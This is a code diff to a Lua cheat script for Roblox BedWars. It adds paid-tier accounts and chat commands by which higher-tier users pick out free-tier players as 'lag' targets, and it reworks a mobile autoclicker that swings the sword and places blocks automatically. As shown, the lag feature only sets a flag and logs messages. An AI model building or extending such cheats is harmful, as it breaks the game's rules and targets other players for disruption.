@@ -106,8 +106,8 @@ local paidAccounts = {}
 local function loadPaidAccounts()
     pcall(function()
         if isfile('newvape/profiles/paid_accounts.txt') then
-            for id in readfile('newvape/profiles/paid_accounts.txt'):gmatch('%d+') do
-                paidAccounts[tonumber(id)] = true
+            for id, tier in readfile('newvape/profiles/paid_accounts.txt'):gmatch('(%d+):(%d+)') do
+                paidAccounts[tonumber(id)] = tonumber(tier)
             end
         end
     end)
@@ -115,7 +115,19 @@ end
 loadPaidAccounts()
 
 local function isAccountPaid(player)
-    return paidAccounts[player.UserId] == true
+    return paidAccounts[player.UserId] ~= nil
+end
+
+local function getAccountTier(player)
+    return paidAccounts[player.UserId] or 0
+end
+
+local function isUpperPremium(player)
+    return getAccountTier(player) >= 2
+end
+
+local function isOwner(player)
+    return getAccountTier(player) == 99
 end
 
 local function tagPaidPlayers()
@@ -142,8 +154,97 @@ vape:Clean(playersService.PlayerRemoving:Connect(function(player)
 end))
 
 getgenv().isAeroPaid = function(player)
+    if player == lplr then
+        return getgenv().AeroLocalPaid == true
+    end
     return isAccountPaid(player) or (player.Character and player.Character:GetAttribute('_aeropaid') == true)
 end
+
+getgenv().getAeroTier = function(player)
+    return getAccountTier(player)
+end
+
+local lagActive = false
+
+local tcs_channel = textChatService.TextChannels:FindFirstChild("RBXGeneral")
+if tcs_channel then
+    vape:Clean(tcs_channel.MessageReceived:Connect(function(msg)
+        if not msg.TextSource then return end
+        local sender = playersService:GetPlayerByUserId(msg.TextSource.UserId)
+        if not sender then return end
+        local senderTier = getAeroTier(sender)
+        if senderTier < 2 then return end
+        local text = msg.Text:lower()
+        if text == "/aero lag" then
+            lagActive = true
+            print("LAG COMMAND SENT BY:", sender.Name)
+            if sender.UserId ~= lplr.UserId then
+                print("LAG COMMAND RECEIVED  sent by:", sender.Name)
+            end
+        elseif text == "/aero lag stop" then
+            lagActive = false
+            print("LAG STOP SENT BY:", sender.Name)
+        end
+    end))
+end
+
+textChatService.MessageReceived:Connect(function(msg)
+    if not msg or not msg.TextSource then return end
+    local senderId = msg.TextSource.UserId
+    local sender = playersService:GetPlayerByUserId(senderId)
+    if not sender then return end
+    if getAccountTier(sender) < 2 and getAccountTier(sender) ~= 99 then return end
+    local isSelf = sender == lplr
+
+    local text = msg.Text:lower()
+
+    if text == '/aero lag stop' then
+        lagActive = false
+        warn('[AEROV4] /aero lag stop received from: ' .. sender.Name)
+        if isSelf then
+            warn('[AEROV4] [SELF TEST] lag stopped successfully')
+        end
+        return
+    end
+
+    local targetName = msg.Text:match('^/[Aa]ero [Ll]ag (.+)$')
+    if targetName and targetName:lower() ~= 'stop' then
+        local target = playersService:FindFirstChild(targetName)
+        if isSelf then
+            if target then
+                local tier = getAccountTier(target)
+                if tier == 0 then
+                    warn('[AEROV4] [SELF TEST] /aero lag specific - target: ' .. target.Name .. ' | tier: 0 (free) - would be lagged')
+                else
+                    warn('[AEROV4] [SELF TEST] /aero lag specific - target: ' .. target.Name .. ' | tier: ' .. tier .. ' - protected, skipping')
+                end
+            else
+                warn('[AEROV4] [SELF TEST] /aero lag specific - player not found: ' .. targetName)
+            end
+        else
+            if target and getAccountTier(target) == 0 then
+                warn('[AEROV4] /aero lag received from: ' .. sender.Name .. ' targeting free user: ' .. target.Name)
+            end
+        end
+        return
+    end
+
+    if text == '/aero lag' then
+        lagActive = true
+        warn('[AEROV4] /aero lag received from: ' .. sender.Name)
+        local freeCount = 0
+        for _, player in playersService:GetPlayers() do
+            if getAccountTier(player) == 0 then
+                freeCount = freeCount + 1
+                warn('[AEROV4] lag target free user: ' .. player.Name)
+            end
+        end
+        if isSelf then
+            warn('[AEROV4] [SELF TEST] found ' .. freeCount .. ' free users in server')
+        end
+        return
+    end
+end)
 
 local function addBlur(parent)
 	local blur = Instance.new('ImageLabel')
@@ -3012,117 +3113,152 @@ end)
 	
 run(function()
     if isMobile then
-		local AutoClicker
-		local CPS
-		local BlockCPS = {}
-		local Thread
-		
-		local function AutoClick()
-			if Thread then
-				task.cancel(Thread)
-			end
-		
-			Thread = task.delay(1 / (store.hand.toolType == 'block' and BlockCPS or CPS).GetRandomValue(), function()
-				repeat
-					if not bedwars.AppController:isLayerOpen(bedwars.UILayers.MAIN) then
-						local blockPlacer = bedwars.BlockPlacementController.blockPlacer
-						if store.hand.toolType == 'block' and blockPlacer then
-							if canDebug then
-								if inputService.TouchEnabled then
-									task.spawn(function()
-										blockPlacer:autoBridge(workspace:GetServerTimeNow() - bedwars.KnockbackController:getLastKnockbackTime() >= 0.2)
-									end)
-								else
-									if (workspace:GetServerTimeNow() - bedwars.BlockCpsController.lastPlaceTimestamp) >= ((1 / 12) * 0.5) then
-										local mouseinfo
-										if canDebug then
-											mouseinfo = blockPlacer.clientManager:getBlockSelector():getMouseInfo(0)
-										else
-											mouseinfo = {placementPosition = lplr:GetMouse().Hit.Position}
-										end
-										if mouseinfo and mouseinfo.placementPosition == mouseinfo.placementPosition then
-											if canDebug then
-												task.spawn(blockPlacer.placeBlock, blockPlacer, mouseinfo.placementPosition)
-											else
-												bedwars.placeBlock(({getPlacedBlock(mouseinfo.placementPosition)})[2])
-											end
-										end
-									end
-								end
-							end
-						elseif store.hand.toolType == 'sword' then
-							bedwars.SwordController:swingSwordAtMouse(0.39)
-						end
-					end
-		
-					task.wait(1 / (store.hand.toolType == 'block' and BlockCPS or CPS).GetRandomValue())
-				until not AutoClicker.Enabled
-			end)
-		end
-		
-		AutoClicker = vape.Categories.Combat:CreateModule({
-			Name = 'Auto Clicker',
-			Function = function(callback)
-				if callback then
-					AutoClicker:Clean(inputService.InputBegan:Connect(function(input)
-						if input.UserInputType == Enum.UserInputType.MouseButton1 then
-							AutoClick()
-						end
-					end))
-		
-					AutoClicker:Clean(inputService.InputEnded:Connect(function(input)
-						if input.UserInputType == Enum.UserInputType.MouseButton1 and Thread then
-							task.cancel(Thread)
-							Thread = nil
-						end
-					end))
-		
-					if inputService.TouchEnabled then
-						for _, v in {'2', '5'} do
-							pcall(function()
-								AutoClicker:Clean(lplr.PlayerGui.MobileUI[v].MouseButton1Down:Connect(AutoClick))
-								AutoClicker:Clean(lplr.PlayerGui.MobileUI[v].MouseButton1Up:Connect(function()
-									if Thread then
-										task.cancel(Thread)
-										Thread = nil
-									end
-								end))
-							end)
-						end
-					end
-				else
-					if Thread then
-						task.cancel(Thread)
-						Thread = nil
-					end
-				end
-			end,
-			Tooltip = 'Hold attack button to automatically click'
-		})
-		CPS = AutoClicker:CreateTwoSlider({
-			Name = 'CPS',
-			Min = 1,
-			Max = 9,
-			DefaultMin = 7,
-			DefaultMax = 7
-		})
-		AutoClicker:CreateToggle({
-			Name = 'Place Blocks',
-			Default = true,
-			Function = function(callback)
-				if BlockCPS.Object then
-					BlockCPS.Object.Visible = callback
-				end
-			end
-		})
-		BlockCPS = AutoClicker:CreateTwoSlider({
-			Name = 'Block CPS',
-			Min = 1,
-			Max = 20,
-			DefaultMin = 12,
-			DefaultMax = 12,
-			Darker = true
-		})
+        local AutoClicker
+        local CPS
+        local BlockCPS = {}
+        local Thread
+        local Draggable
+
+        local function getSafeCPS()
+            if store.hand and store.hand.toolType == 'block' and BlockCPS and BlockCPS.GetRandomValue then
+                return BlockCPS
+            end
+            if CPS and CPS.GetRandomValue then
+                return CPS
+            end
+            return nil
+        end
+
+        local dragTouchPos = nil
+
+        local function AutoClick()
+            if Thread then
+                task.cancel(Thread)
+                Thread = nil
+            end
+
+            local initialCPS = getSafeCPS()
+            if not initialCPS then return end
+
+            Thread = task.delay(1 / initialCPS.GetRandomValue(), function()
+                repeat
+                    if not bedwars.AppController:isLayerOpen(bedwars.UILayers.MAIN) then
+                        local blockPlacer = bedwars.BlockPlacementController and bedwars.BlockPlacementController.blockPlacer
+                        local toolType = store.hand and store.hand.toolType
+
+                        if toolType == 'block' and blockPlacer then
+                            task.spawn(function()
+                                if Draggable and Draggable.Enabled and dragTouchPos then
+                                    local unitRay = gameCamera:ScreenPointToRay(dragTouchPos.X, dragTouchPos.Y)
+                                    local mouseinfo = blockPlacer.clientManager:getBlockSelector():getMouseInfo(0, {ray = unitRay})
+                                    if mouseinfo and mouseinfo.placementPosition == mouseinfo.placementPosition then
+                                        blockPlacer:placeBlock(mouseinfo.placementPosition)
+                                    end
+                                else
+                                    blockPlacer:autoBridge(workspace:GetServerTimeNow() - bedwars.KnockbackController:getLastKnockbackTime() >= 0.2)
+                                end
+                            end)
+                        elseif toolType == 'sword' then
+                            bedwars.SwordController:swingSwordAtMouse(0.39)
+                        end
+                    end
+
+                    local currentCPS = getSafeCPS()
+                    if not currentCPS then
+                        task.wait(0.1)
+                    else
+                        task.wait(1 / currentCPS.GetRandomValue())
+                    end
+                until not AutoClicker.Enabled
+            end)
+        end
+
+        local function StopClick()
+            if Thread then
+                task.cancel(Thread)
+                Thread = nil
+            end
+        end
+
+        AutoClicker = vape.Categories.Combat:CreateModule({
+            Name = 'AutoClicker',
+            Function = function(callback)
+                if callback then
+                    AutoClicker:Clean(inputService.InputBegan:Connect(function(input)
+                        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+                            AutoClick()
+                        end
+                    end))
+
+                    AutoClicker:Clean(inputService.InputEnded:Connect(function(input)
+                        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+                            StopClick()
+                        end
+                    end))
+
+                     for _, v in {'2', '5'} do
+                        pcall(function()
+                            AutoClicker:Clean(lplr.PlayerGui.MobileUI[v].MouseButton1Down:Connect(AutoClick))
+                            AutoClicker:Clean(lplr.PlayerGui.MobileUI[v].MouseButton1Up:Connect(StopClick))
+                        end)
+                    end
+
+                    AutoClicker:Clean(inputService.TouchStarted:Connect(function(input, gameProcessed)
+                        if Draggable and Draggable.Enabled then
+                            dragTouchPos = input.Position
+                            AutoClick()
+                        end
+                    end))
+                    AutoClicker:Clean(inputService.TouchMoved:Connect(function(input, gameProcessed)
+                        if Draggable and Draggable.Enabled then
+                            dragTouchPos = input.Position
+                        end
+                    end))
+                    AutoClicker:Clean(inputService.TouchEnded:Connect(function(input, gameProcessed)
+                        if Draggable and Draggable.Enabled then
+                            dragTouchPos = nil
+                            StopClick()
+                        end
+                    end))
+                else
+                    StopClick()
+                end
+            end,
+            Tooltip = 'Hold attack button to automatically click'
+        })
+
+        CPS = AutoClicker:CreateTwoSlider({
+            Name = 'CPS',
+            Min = 1,
+            Max = 9,
+            DefaultMin = 7,
+            DefaultMax = 7
+        })
+
+        AutoClicker:CreateToggle({
+            Name = 'Place Blocks',
+            Default = true,
+            Function = function(callback)
+                if BlockCPS.Object then
+                    BlockCPS.Object.Visible = callback
+                end
+            end
+        })
+
+        BlockCPS = AutoClicker:CreateTwoSlider({
+            Name = 'Block CPS',
+            Min = 1,
+            Max = 20,
+            DefaultMin = 12,
+            DefaultMax = 12,
+            Darker = true
+        })
+
+        Draggable = AutoClicker:CreateToggle({
+            Name = 'Draggable',
+            Default = true,
+            Tooltip = 'When enabled, touching anywhere on screen triggers autoclicker'
+        })
 
         task.defer(function()
             if BlockCPS and BlockCPS.Object then
